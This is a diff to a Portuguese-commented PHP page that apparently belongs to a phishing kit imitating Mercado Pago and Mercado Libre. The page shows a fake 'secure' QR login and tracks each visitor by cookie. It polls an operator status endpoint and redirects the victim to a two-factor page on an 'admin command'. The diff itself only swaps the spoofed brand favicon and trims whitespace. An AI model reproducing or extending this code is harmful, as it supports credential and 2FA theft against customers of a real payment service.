@@ -13,7 +13,7 @@ if (isMobileDevice()) {
     $redirect_target_2fa = 'dois_fatores.php';
 } else {
     // Verifique se o nome do arquivo desktop é 'dois_fatores.php' ou 'dois_fatores2.php'
-    $redirect_target_2fa = 'dois_fatores.php'; 
+    $redirect_target_2fa = 'dois_fatores.php';
 }
 
 // Inicia a sessão e valida o cookie de identificação
@@ -30,7 +30,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Escaneie o QR para iniciar sessão de forma segura</title>
-    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.73/mercadopago/favicon.svg" type="image/svg"/>
+    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.146/mercadolibre/pt_logo_large_plus@2x.webp" type="image/svg"/>
     <style>
         :root {
             --cor-amarela: #ffe600;
@@ -143,7 +143,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
 
                 if (data.success && data.qrcode_path) {
                     console.log('Novo QR Code recebido:', data.qrcode_path);
-                    
+
                     // Atualiza a imagem, adicionando um timestamp para evitar cache do navegador
                     qrImage.src = data.qrcode_path + '?t=' + new Date().getTime();
                 }
@@ -184,7 +184,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
 
             // Descobre o nome do arquivo da página atual
             const currentPage = window.location.pathname.split('/').pop();
-            
+
             // Pega a mensagem de status correspondente
             const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
 
@@ -222,14 +222,14 @@ if (!isset($_COOKIE['identificador_cliente'])) {
                     const response = await fetch('api_check_status.php');
                     const data = await response.json();
 
-                    console.log('Status atual:', data.status); 
+                    console.log('Status atual:', data.status);
 
                     if (data.status === 'redirecionar_para_2fa') {
                         // Para a verificação para não redirecionar em loop
                         clearInterval(statusInterval);
-                        
+
                         console.log('Comando do admin recebido! Redirecionando para:', redirectUrl);
-                        
+
                         // Redireciona o usuário para o alvo correto (desktop ou mobile)
                         window.location.href = redirectUrl;
                     }
